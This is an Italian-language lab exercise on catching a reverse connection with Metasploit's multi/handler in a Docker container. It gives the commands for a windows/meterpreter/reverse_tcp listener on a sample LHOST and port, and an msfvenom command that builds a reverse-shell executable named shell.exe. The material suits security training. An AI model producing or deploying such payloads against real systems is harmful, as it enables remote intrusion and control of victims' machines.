# 🧪 Esercizio 2 – Uso del modulo multi/handler in Metasploit

## 🎯 Obiettivo
Simulare la ricezione di una connessione reverse da un payload Windows usando il modulo `multi/handler` di Metasploit.  
L’esercizio è pensato per ambienti Docker via browser, come [Play with Docker](https://labs.play-with-docker.com), e non richiede un target reale.

---

## 🐳 1. Avvio del container Metasploit

Nel terminale PWD:

```bash
docker run --rm -it metasploitframework/metasploit-framework

💻 2. Avvio della console Metasploit

msfconsole

🔍 3. Caricamento del modulo handler

use exploit/multi/handler


⚙️ 4. Configurazione del payload

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.0.100
set LPORT 4444


🚀 5. Avvio del listener

exploit


🔎 Output atteso:

[*] Started reverse TCP handler on 192.168.0.100:4444


🧪 6. Simulazione del payload

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe > shell.exe


